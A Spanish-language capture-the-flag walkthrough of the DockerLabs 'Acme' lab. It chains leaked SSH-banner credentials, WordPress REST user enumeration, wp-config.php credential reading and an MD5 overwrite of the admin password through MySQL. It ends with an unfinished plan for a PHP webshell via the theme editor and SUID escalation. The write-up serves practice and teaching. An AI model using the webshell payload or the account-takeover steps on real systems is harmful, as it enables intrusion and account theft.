La máquina Acme de la plataforma DockerLabs es una máquina de dificultad "Muy Fácil" que enseña cómo un portal en mantenimiento puede filtrar credenciales de acceso a través del propio banner de SSH. Una vez dentro, expone servicios web internos (WordPress) que permiten practicar un camino completo de explotación: enumeración de usuarios, lectura de configuración sensible y manipulación directa de la base de datos para tomar control del panel de administración.

# ACME

## 🚀 DESPLIEGUE DE MÁQUINA

Descarga y despliegue del laboratorio desde DockerLabs:

```bash
sudo bash auto_deploy.sh acme.tar
```

Tras el despliegue se obtiene la IP interna de la máquina: `172.17.0.2`.

## 🔎 ENUMERACIÓN

### Escaneo de puertos

```bash
nmap -sC -sV -p- -T4 172.17.0.2
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.16 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: ACME Corporation - Portal en Mantenimiento
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-robots.txt: 1 disallowed entry
|_/migration_notes.txt
```

Solo dos puertos abiertos: SSH y un portal web "en mantenimiento". El propio script de nmap revela una entrada bloqueada en `robots.txt`.

### Archivo filtrado

```bash
curl http://172.17.0.2/migration_notes.txt
```

```
================================================================================
MEMORANDO DE MIGRACION DE INFRAESTRUCTURA - ACME CORP
================================================================================
Estado: Migracion interna activa
Aviso: El acceso a este servidor se canaliza por SSH (puerto 22).
Consulte el banner de conexion de SSH para obtener las instrucciones del nodo.
================================================================================
```

No da credenciales directamente, pero indica que la siguiente pista está en el banner de SSH.

## 💣 EXPLOTACIÓN

### Credenciales filtradas en el banner SSH

Al conectar con cualquier usuario, antes incluso de pedir autenticación, el servidor muestra un banner con credenciales en texto plano:

```bash
ssh usuario_cualquiera@172.17.0.2
```

```
===================================================================
[*] ACME Corporation - Nodo Bastion de Mantenimiento Interno
[!] AVISO DE SEGURIDAD Y ACCESO:
[!] Portal corporativo en proceso de migracion a infraestructura interna.
[!] Credenciales temporales asignadas para tareas de mantenimiento:
[!]   - Usuario: usuario
[!]   - Password: P@ssw0rd2026_CTF!
===================================================================
```

> ⚠️ Nota: la contraseña contiene `!`, que bash interpreta como expansión de historial si va entre comillas dobles. Hay que usar comillas simples (`'...'`) al usarla en comandos.

Acceso a la máquina:

```bash
ssh usuario@172.17.0.2
```

### Enumeración interna de servicios

Con sesión SSH activa, se listan los puertos en escucha local:

```bash
ss -tulnp
```

```
Netid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port
tcp    LISTEN  0       0            127.0.0.1:9000        0.0.0.0:*
tcp    LISTEN  0       0              0.0.0.0:80          0.0.0.0:*
tcp    LISTEN  0       0              0.0.0.0:22          0.0.0.0:*
tcp    LISTEN  0       0            127.0.0.1:8080        0.0.0.0:*
tcp    LISTEN  0       0            127.0.0.1:3306        0.0.0.0:*
```

Tres servicios adicionales solo visibles desde dentro:

- `9000` → PHP-FPM
- `8080` → Apache / WordPress
- `3306` → MySQL/MariaDB

### Identificación de WordPress

```bash
curl -I http://127.0.0.1:8080
```

```
HTTP/1.1 200 OK
Server: Apache/2.4.52 (Ubuntu)
Link: <http://127.0.0.1:8080/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8
```

El header `Link` confirma WordPress. La ruta "bonita" de la API (`/wp-json/`) devuelve 404 por configuración de permalinks, pero sigue activa vía parámetro:

```bash
curl -s "http://127.0.0.1:8080/?rest_route=/wp/v2/users"
```

Resultado: usuario válido `acme_admin`.

También se confirma la versión de WordPress:

```bash
curl -s http://127.0.0.1:8080/ | grep -i "generator"
```

```
<meta name="generator" content="WordPress 6.9.1" />
```

### Intento de reutilización de credenciales (descartado)

```bash
curl -s -i -c cookies.txt -d 'log=acme_admin&pwd=P@ssw0rd2026_CTF!&wp-submit=Log+In&redirect_to=http://127.0.0.1:8080/wp-admin/' http://127.0.0.1:8080/wp-login.php
```

Respuesta: `Error: The password you entered for the username acme_admin is incorrect`. Confirma que el usuario existe, pero descarta la reutilización directa de la contraseña de SSH.

### Lectura de configuración de WordPress

Con acceso al sistema de ficheros vía SSH, se localiza y lee la configuración de la aplicación:

```bash
cat /var/www/wordpress/wp-config.php
```

```php
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wp_user' );
define( 'DB_PASSWORD', 'wp_secure_pass_2026' );
define( 'DB_HOST', '127.0.0.1' );
...
define( 'DISALLOW_FILE_EDIT', false );
define( 'DISALLOW_FILE_MODS', false );
```

Se obtienen credenciales de la base de datos en texto plano, y se confirma que el editor de archivos de temas/plugins de WordPress está habilitado (clave para el siguiente paso de explotación).

### Toma de control del administrador vía MySQL

```bash
mysql -u wp_user -p'wp_secure_pass_2026' -h 127.0.0.1 wordpress
```

En lugar de crackear el hash original, se sobrescribe directamente aprovechando el soporte heredado de WordPress para hashes MD5:

```sql
UPDATE wp_users SET user_pass = MD5('ataque') WHERE user_login = 'acme_admin';
```

Verificación del login:

```bash
curl -s -i -c cookies.txt -d 'log=acme_admin&pwd=ataque&wp-submit=Log+In&redirect_to=http://127.0.0.1:8080/wp-admin/' http://127.0.0.1:8080/wp-login.php | grep -i "location"
```

→ ✅ Redirección a `/wp-admin/` confirmada. Acceso de administrador conseguido.

### Camino hacia RCE (en curso)

Con `DISALLOW_FILE_EDIT` deshabilitado, el plan para conseguir ejecución de comandos es:

1. **Apariencia → Editor de archivos de tema** en el panel de WordPress.
2. Editar un archivo poco usado del tema activo (ej. `404.php`) e insertar:

   ```php
   <?php system($_GET['cmd']); ?>
   ```
3. Ejecutar comandos del sistema:

   ```bash
   curl "http://127.0.0.1:8080/wp-content/themes/<tema>/404.php?cmd=id"
   ```

Esto debería dar una shell como `www-data`, el usuario de Apache/PHP — distinto del usuario SSH inicial.

## 🔑 ESCALADA DE PRIVILEGIOS

*(Pendiente de completar en esta sesión.)*

Una vez se consiga ejecución de comandos como `www-data` vía la webshell, el siguiente paso estándar es comprobar binarios con permisos SUID, que suelen ser la vía de escalada más directa en este tipo de máquinas:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Si aparecen binarios como `/usr/bin/bash` o `/usr/bin/dash` con el bit SUID activo, se puede lanzar una shell privilegiada directamente:

```bash
bash -p
```

---

## Cadena de ataque (resumen)

```
nmap → robots.txt (migration_notes.txt)
  → Pista hacia banner SSH
  → Credenciales filtradas en banner SSH → acceso SSH
  → ss -tulnp revela servicios internos (WordPress :8080, MySQL :3306)
  → API REST de WordPress filtra usuario (acme_admin)
  → Reutilización de credencial SSH en WP → falla (usuario confirmado)
  → wp-config.php (en disco) revela credenciales de MySQL
  → UPDATE directo del hash de password vía MySQL
  → Login como admin en WordPress
  → [EN CURSO] Webshell vía editor de temas → RCE como www-data
  → [PENDIENTE] Escalada de privilegios (binarios SUID u otra vía) → root
```

## Notas y lecciones

- Un `robots.txt` no bloquea el acceso, solo pide a los buscadores que no indexen — cualquier ruta "disallowed" merece revisión manual.
- El banner de SSH se muestra antes de autenticar: una filtración de credenciales ahí es un fallo real de configuración, no solo un recurso de CTF.
- `127.0.0.1` en `ss -tulnp` significa "solo accesible desde dentro" — justo lo que la descripción de la máquina llamaba "servicios web internos".
- Si `/wp-json/` da 404, probar siempre `/?rest_route=/wp/v2/...` como alternativa antes de asumir que la API REST está desactivada.
- Con acceso de lectura al sistema de ficheros, no hace falta "adivinar" contraseñas: leer la configuración de la aplicación suele ser más rápido y fiable.
- WordPress mantiene compatibilidad con hashes MD5 antiguos como fallback: si tienes acceso de escritura a la base de datos, puedes tomar cualquier cuenta sin necesidad de crackear nada.